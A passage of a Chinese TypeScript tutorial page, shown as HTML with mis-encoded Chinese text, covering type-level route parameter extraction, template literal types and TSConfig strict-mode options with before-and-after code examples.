class="hljs-number">1</span>&gt;&gt;<br>    : <span class="hljs-title class_">Path</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-built_in">string</span>&#125;</span>:<span class="hljs-subst">$&#123;infer Param&#125;</span>`</span><br>      ? <span class="hljs-title class_">Param</span><br>      : <span class="hljs-built_in">never</span>;<br></code></pre></td></tr></table></figure><p>è·¯å¾„å†²çªæ£€æµ‹ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">DetectConflict</span>&lt;<span class="hljs-title class_">Path</span>&gt; = <br>  <span class="hljs-title class_">ExtractParam</span>&lt;<span class="hljs-title class_">Path</span>&gt; <span class="hljs-keyword">extends</span> infer P<br>    ? P <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span><br>      ? &#123; [K <span class="hljs-keyword">in</span> P]: K &#125; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;P, P&gt;<br>        ? <span class="hljs-title class_">Path</span>  <span class="hljs-comment">// æ— å†²çª</span><br>        : <span class="hljs-built_in">never</span> <span class="hljs-comment">// å­˜åœ¨é‡å¤å‚æ•°</span><br>      : <span class="hljs-built_in">never</span><br>    : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">SafePath</span> = <span class="hljs-title class_">DetectConflict</span>&lt;<span class="hljs-string">&#x27;/user/:id/posts/:id&#x27;</span>&gt;;  <span class="hljs-comment">// never (æ£€æµ‹åˆ°é‡å¤id)</span><br></code></pre></td></tr></table></figure><p><strong>é¢è¯•çº§è€ƒç‚¹</strong></p><ol><li>æ¨¡æ¿å­—é¢é‡ç±»å‹æ“ä½œï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">SplitPath</span>&lt;P&gt; = P <span class="hljs-keyword">extends</span> <span class="hljs-string">`/<span class="hljs-subst">$&#123;infer Part&#125;</span>/<span class="hljs-subst">$&#123;infer Rest&#125;</span>`</span> <br>  ? [<span class="hljs-title class_">Part</span>, ...<span class="hljs-title class_">SplitPath</span>&lt;<span class="hljs-string">`/<span class="hljs-subst">$&#123;Rest&#125;</span>`</span>&gt;] <br>  : P <span class="hljs-keyword">extends</span> <span class="hljs-string">`/<span class="hljs-subst">$&#123;infer Part&#125;</span>`</span> <br>    ? [<span class="hljs-title class_">Part</span>] <br>    : [];<br></code></pre></td></tr></table></figure><ol start="2"><li>ç±»å‹é€’å½’é™åˆ¶ï¼šTS 4.5+ æ”¯æŒå°¾é€’å½’ä¼˜åŒ–</li><li>React Router v6 ç±»å‹å®ç°ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å®˜æ–¹ParamKeyç±»å‹å®šä¹‰</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ParamKey</span>&lt;<span class="hljs-title class_">TPath</span>&gt; = <span class="hljs-title class_">TPath</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;infer _&#125;</span>:<span class="hljs-subst">$&#123;infer Param&#125;</span>/<span class="hljs-subst">$&#123;infer Rest&#125;</span>`</span><br>  ? <span class="hljs-title class_">Param</span> | <span class="hljs-title class_">ParamKey</span>&lt;<span class="hljs-title class_">Rest</span>&gt;<br>  : <span class="hljs-title class_">TPath</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;infer _&#125;</span>:<span class="hljs-subst">$&#123;infer Param&#125;</span>`</span><br>    ? <span class="hljs-title class_">Param</span><br>    : <span class="hljs-built_in">never</span>;<br></code></pre></td></tr></table></figure><ol start="4"><li>Vue Router å¯¹æ¯”ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// Vue Routerçš„RouteRecordRawç±»å‹</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">RouteRecordRaw</span> &#123;<br>  <span class="hljs-attr">path</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">component</span>: <span class="hljs-title class_">Component</span>;<br>  <span class="hljs-attr">children</span>?: <span class="hljs-title class_">RouteRecordRaw</span>[];<br>&#125;<br></code></pre></td></tr></table></figure><ol start="5"><li>ç»ˆææŒ‘æˆ˜ï¼šå®ç°Next.jsæ–‡ä»¶è·¯ç”±ç±»å‹</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">NextPageParams</span>&lt;<span class="hljs-title class_">Path</span>&gt; = <br>  <span class="hljs-title class_">Path</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">`pages/<span class="hljs-subst">$&#123;infer Route&#125;</span>.tsx`</span> <br>    ? <span class="hljs-title class_">PathParams</span>&lt;<span class="hljs-title class_">Route</span>&gt;<br>    : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// æ–‡ä»¶è·¯å¾„: pages/user/[id]/[tab].tsx</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Params</span> = <span class="hljs-title class_">NextPageParams</span>&lt;<span class="hljs-string">&#x27;pages/user/[id]/[tab].tsx&#x27;</span>&gt;; <br><span class="hljs-comment">// &#123; id: string; tab: string &#125;</span><br></code></pre></td></tr></table></figure><h2 id="2-3-æ¨¡æ¿å­—é¢é‡ç±»å‹"><a href="#2-3-æ¨¡æ¿å­—é¢é‡ç±»å‹" class="headerlink" title="2.3 æ¨¡æ¿å­—é¢é‡ç±»å‹"></a>2.3 æ¨¡æ¿å­—é¢é‡ç±»å‹</h2><h3 id="2-3-1-å­—ç¬¦ä¸²æ¨¡æ¿ç±»å‹æ“ä½œ"><a href="#2-3-1-å­—ç¬¦ä¸²æ¨¡æ¿ç±»å‹æ“ä½œ" class="headerlink" title="2.3.1 å­—ç¬¦ä¸²æ¨¡æ¿ç±»å‹æ“ä½œ"></a>2.3.1 å­—ç¬¦ä¸²æ¨¡æ¿ç±»å‹æ“ä½œ</h3><h3 id="2-3-2-Uppercase-Lowercase-ç±»å‹è½¬æ¢"><a href="#2-3-2-Uppercase-Lowercase-ç±»å‹è½¬æ¢" class="headerlink" title="2.3.2 Uppercase&#x2F;Lowercase ç±»å‹è½¬æ¢"></a>2.3.2 Uppercase&#x2F;Lowercase ç±»å‹è½¬æ¢</h3><h3 id="2-3-3-è·¯ç”±è·¯å¾„æ¨¡å¼åŒ¹é…"><a href="#2-3-3-è·¯ç”±è·¯å¾„æ¨¡å¼åŒ¹é…" class="headerlink" title="2.3.3 è·¯ç”±è·¯å¾„æ¨¡å¼åŒ¹é…"></a>2.3.3 è·¯ç”±è·¯å¾„æ¨¡å¼åŒ¹é…</h3><h3 id="2-3-4-å›½é™…åŒ–é”®åè‡ªåŠ¨è¡¥å…¨"><a href="#2-3-4-å›½é™…åŒ–é”®åè‡ªåŠ¨è¡¥å…¨" class="headerlink" title="2.3.4 å›½é™…åŒ–é”®åè‡ªåŠ¨è¡¥å…¨"></a>2.3.4 å›½é™…åŒ–é”®åè‡ªåŠ¨è¡¥å…¨</h3><h2 id="2-4-ç±»å‹ç¼–ç¨‹ä¼˜åŒ–"><a href="#2-4-ç±»å‹ç¼–ç¨‹ä¼˜åŒ–" class="headerlink" title="2.4 ç±»å‹ç¼–ç¨‹ä¼˜åŒ–"></a>2.4 ç±»å‹ç¼–ç¨‹ä¼˜åŒ–</h2><h3 id="2-4-1-ç±»å‹é€’å½’ä¸å°¾é€’å½’ä¼˜åŒ–"><a href="#2-4-1-ç±»å‹é€’å½’ä¸å°¾é€’å½’ä¼˜åŒ–" class="headerlink" title="2.4.1 ç±»å‹é€’å½’ä¸å°¾é€’å½’ä¼˜åŒ–"></a>2.4.1 ç±»å‹é€’å½’ä¸å°¾é€’å½’ä¼˜åŒ–</h3><h3 id="2-4-2-ç±»å‹å®ä¾‹åŒ–æ·±åº¦æ§åˆ¶"><a href="#2-4-2-ç±»å‹å®ä¾‹åŒ–æ·±åº¦æ§åˆ¶" class="headerlink" title="2.4.2 ç±»å‹å®ä¾‹åŒ–æ·±åº¦æ§åˆ¶"></a>2.4.2 ç±»å‹å®ä¾‹åŒ–æ·±åº¦æ§åˆ¶</h3><h3 id="2-4-3-æ¡ä»¶ç±»å‹çŸ­è·¯æŠ€å·§"><a href="#2-4-3-æ¡ä»¶ç±»å‹çŸ­è·¯æŠ€å·§" class="headerlink" title="2.4.3 æ¡ä»¶ç±»å‹çŸ­è·¯æŠ€å·§"></a>2.4.3 æ¡ä»¶ç±»å‹çŸ­è·¯æŠ€å·§</h3><h3 id="2-4-4-ç±»å‹æ€§èƒ½åˆ†æå·¥å…·"><a href="#2-4-4-ç±»å‹æ€§èƒ½åˆ†æå·¥å…·" class="headerlink" title="2.4.4 ç±»å‹æ€§èƒ½åˆ†æå·¥å…·"></a>2.4.4 ç±»å‹æ€§èƒ½åˆ†æå·¥å…·</h3><h1 id="ä¸‰ã€å·¥ç¨‹åŒ–å®è·µ"><a href="#ä¸‰ã€å·¥ç¨‹åŒ–å®è·µ" class="headerlink" title="ä¸‰ã€å·¥ç¨‹åŒ–å®è·µ"></a>ä¸‰ã€å·¥ç¨‹åŒ–å®è·µ</h1><h2 id="3-1-TSConfig-æ·±åº¦é…ç½®"><a href="#3-1-TSConfig-æ·±åº¦é…ç½®" class="headerlink" title="3.1 TSConfig æ·±åº¦é…ç½®"></a>3.1 TSConfig æ·±åº¦é…ç½®</h2><h3 id="3-1-1-ä¸¥æ ¼æ¨¡å¼å…¨å®¶æ¡¶é…ç½®"><a href="#3-1-1-ä¸¥æ ¼æ¨¡å¼å…¨å®¶æ¡¶é…ç½®" class="headerlink" title="3.1.1 ä¸¥æ ¼æ¨¡å¼å…¨å®¶æ¡¶é…ç½®"></a>3.1.1 ä¸¥æ ¼æ¨¡å¼å…¨å®¶æ¡¶é…ç½®</h3><p><strong>ä¸¥æ ¼æ¨¡å¼æ ¸å¿ƒé…ç½®</strong></p><p>å¯ç”¨æ‰€æœ‰ä¸¥æ ¼æ£€æŸ¥ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;compilerOptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;strict&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>æ­¤é…ç½®ç­‰ä»·äºåŒæ—¶å¯ç”¨ä»¥ä¸‹æ‰€æœ‰å­é€‰é¡¹ï¼ˆTypeScript 2.3+ï¼‰ã€‚</p><p><strong>ä¸¥æ ¼æ¨¡å¼å­é€‰é¡¹è¯¦è§£</strong></p><table><thead><tr><th align="left">é€‰é¡¹</th><th align="left">é»˜è®¤å€¼</th><th align="left">ä½œç”¨</th><th align="left">æ¨èå€¼</th></tr></thead><tbody><tr><td align="left">strict</td><td align="left">false</td><td align="left">æ‰€æœ‰ä¸¥æ ¼æ£€æŸ¥çš„æ€»å¼€å…³</td><td align="left">true</td></tr><tr><td align="left">noImplicitAny</td><td align="left">false</td><td align="left">ç¦æ­¢éšå¼ any ç±»å‹</td><td align="left">true</td></tr><tr><td align="left">noImplicitThis</td><td align="left">false</td><td align="left">ç¦æ­¢éšå¼ any ç±»å‹çš„ this</td><td align="left">true</td></tr><tr><td align="left">strictNullChecks</td><td align="left">false</td><td align="left">ä¸¥æ ¼çš„ null&#x2F;undefined æ£€æŸ¥</td><td align="left">true</td></tr><tr><td align="left">strictFunctionTypes</td><td align="left">false</td><td align="left">ä¸¥æ ¼çš„å‡½æ•°ç±»å‹æ£€æŸ¥ï¼ˆé€†å˜å‚æ•°ï¼‰</td><td align="left">true</td></tr><tr><td align="left">strictBindCallApply</td><td align="left">false</td><td align="left">ä¸¥æ ¼çš„ bind&#x2F;call&#x2F;apply æ–¹æ³•æ£€æŸ¥</td><td align="left">true</td></tr><tr><td align="left">strictPropertyInitialization</td><td align="left">false</td><td align="left">ä¸¥æ ¼çš„ç±»å±æ€§åˆå§‹åŒ–æ£€æŸ¥ï¼ˆéœ€é…åˆ strictNullChecksï¼‰</td><td align="left">true</td></tr><tr><td align="left">alwaysStrict</td><td align="left">false</td><td align="left">ä»¥ä¸¥æ ¼æ¨¡å¼è§£æä»£ç ï¼Œå¹¶åœ¨æ¯ä¸ªæ–‡ä»¶é¡¶éƒ¨æ·»åŠ  â€œuse strictâ€</td><td align="left">true</td></tr><tr><td align="left">useUnknownInCatchVariables</td><td align="left">false</td><td align="left">catch å­å¥å˜é‡é»˜è®¤ä¸º unknown ç±»å‹ï¼ˆTS 4.4+ï¼‰</td><td align="left">true</td></tr></tbody></table><p><strong>é…ç½®è¯¦è§£ä¸å·¥ç¨‹å®è·µ</strong></p><ol><li>noImplicitAny</li></ol><p>é—®é¢˜ä»£ç ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">log</span>(<span class="hljs-params">message</span>) &#123; <span class="hljs-comment">// ğŸš« å‚æ•°éšå¼ any</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(message);<br>&#125;<br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">log</span>(<span class="hljs-params"><span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span></span>) &#123; <span class="hljs-comment">// âœ… æ˜¾å¼å£°æ˜ç±»å‹</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(message);<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>strictNullChecks</li></ol><p>é—®é¢˜ä»£ç ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> element = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;app&quot;</span>);<br>element.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">&quot;Hello&quot;</span>; <span class="hljs-comment">// ğŸš« å¯èƒ½ä¸º null</span><br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> element = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;app&quot;</span>);<br><span class="hljs-keyword">if</span> (element) &#123; <span class="hljs-comment">// âœ… å®‰å…¨æ£€æŸ¥</span><br>  element.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">&quot;Hello&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>strictPropertyInitialization</li></ol><p>é—®é¢˜ä»£ç ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// ğŸš« æœªåˆå§‹åŒ–</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>  name!: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// âœ… æ˜ç¡®èµ‹å€¼æ–­è¨€</span><br>  <span class="hljs-comment">// æˆ–</span><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">public</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span></span>) &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="4"><li>useUnknownInCatchVariables</li></ol><p>é—®é¢˜ä»£ç ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">try</span> &#123; <span class="hljs-comment">/* ... */</span> &#125; <br><span class="hljs-keyword">catch</span> (err) &#123; <span class="hljs-comment">// any ç±»å‹</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err.<span class="hljs-property">message</span>); <span class="hljs-comment">// ğŸš« å¯èƒ½ä¸å­˜åœ¨</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">try</span> &#123; <span class="hljs-comment">/* ... */</span> &#125; <br><span class="hljs-keyword">catch</span> (<span class="hljs-attr">err</span>: <span class="hljs-built_in">unknown</span>) &#123; <span class="hljs-comment">// âœ… TS 4.4+</span><br>  <span class="hljs-keyword">if</span> (err <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Error</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err.<span class="hljs-property">message</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å››ã€ä¸¥æ ¼æ¨¡å¼é…ç½®ç­–ç•¥</p><ol><li>æ¸è¿›å¯ç”¨ç­–ç•¥ï¼š</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;compilerOptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;strict&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;noImplicitAny&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span> <span class="hljs-comment">// ä¸´æ—¶å…³é—­æœ€ä¸¥æ ¼çš„è§„åˆ™</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>æ–‡ä»¶çº§è¦†ç›–ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// @ts-nocheck  // ç¦ç”¨æ•´ä¸ªæ–‡ä»¶æ£€æŸ¥</span><br><span class="hljs-comment">// @ts-ignore   // ç¦ç”¨ä¸‹ä¸€è¡Œæ£€æŸ¥</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">legacyCode</span>(<span class="hljs-params"></span>) &#123; <br>  <span class="hljs-comment">// @ts-expect-error // é¢„æœŸé”™è¯¯ï¼ˆTS 3.9+ï¼‰</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span> = <span class="hljs-string">&quot;string&quot;</span>; <br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>ç›®å½•å·®å¼‚åŒ–é…ç½®ï¼š</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// æ ¹ç›®å½• tsconfig.json</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;extends&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;./tsconfig.base.json&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;references&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>    <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;./src&quot;</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// åº”ç”¨ä¸¥æ ¼æ¨¡å¼</span><br>    <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;./legacy&quot;</span> <span class="hljs-punctuation">&#125;</span>      <span class="hljs-comment">// éä¸¥æ ¼æ¨¡å¼</span><br>  <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-comment">// legacy/tsconfig.json</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;extends&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;../tsconfig.base.json&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;compilerOptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;strict&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½ä¸ä¸¥æ ¼æ¨¡å¼</strong></p><ol><li>ç¼–è¯‘é€Ÿåº¦å½±å“ï¼š</li></ol><table><thead><tr><th align="left">ä¸¥æ ¼é€‰é¡¹</th><th align="left">æ€§èƒ½å½±å“</th><th align="left">ç¼“è§£æªæ–½</th></tr></thead><tbody><tr><td align="left">strictNullChecks</td><td align="left">ä¸­</td><td align="left">é¡¹ç›®å¼•ç”¨éš”ç¦»ä¿®æ”¹èŒƒå›´</td></tr><tr><td align="left">noImplicitAny</td><td align="left">é«˜</td><td align="left">æ¸è¿›å¯ç”¨ + @ts-ignore ä¸´æ—¶æ–¹æ¡ˆ</td></tr><tr><td align="left">strictFunctionTypes</td><td align="left">ä½</td><td align="left">æ— éœ€ç‰¹åˆ«å¤„ç†</td></tr></tbody></table><ol start="2"><li>å†…å­˜å ç”¨ä¼˜åŒ–ï¼š</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;compilerOptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;strict&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;incremental&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// å¢é‡ç¼–è¯‘</span><br>    <span class="hljs-attr">&quot;tsBuildInfoFile&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;./buildcache/.tsbuildinfo&quot;</span> <span class="hljs-comment">// ç¼“å­˜ä½ç½®</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>ä¸¥æ ¼æ¨¡å¼é”™è¯¯å¤„ç†</strong></p><ol><li>å¸¸è§é”™è¯¯ç±»å‹ï¼š</li></ol><p>| é”™è¯¯ä»£ç  | å«ä¹‰ | è§£å†³æ–¹æ¡ˆ |<br>| TS7006 | å‚æ•°éšå¼ any | æ·»åŠ ç±»å‹æ³¨è§£ |<br>| TS2532 | å¯¹è±¡å¯èƒ½ä¸º undefined | æ·»åŠ ç©ºå€¼æ£€æŸ¥ |<br>| TS2564 | å±æ€§æœªåˆå§‹åŒ– | æ„é€ å‡½æ•°åˆå§‹åŒ–æˆ–æ˜ç¡®èµ‹å€¼æ–­è¨€ |<br>| TS2345 | å‚æ•°ç±»å‹ä¸åŒ¹é… | ä¿®æ­£å‚æ•°ç±»å‹æˆ–ä½¿ç”¨ç±»å‹æ–­è¨€ |</p><ol start="2"><li>é”™è¯¯è‡ªåŠ¨ä¿®å¤ï¼š</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// .vscode/settings.json</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;typescript.tsserver.experimental.enableProjectDiagnostics&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;editor.codeActionsOnSave&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;source.fixAll.ts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>ä¼ä¸šçº§é…ç½®æ¨¡æ¿</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// tsconfig.strict.json</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;compilerOptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;strict&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;noFallthroughCasesInSwitch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;noUnusedLocals&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;noUnusedParameters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;noImplicitReturns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>    <span 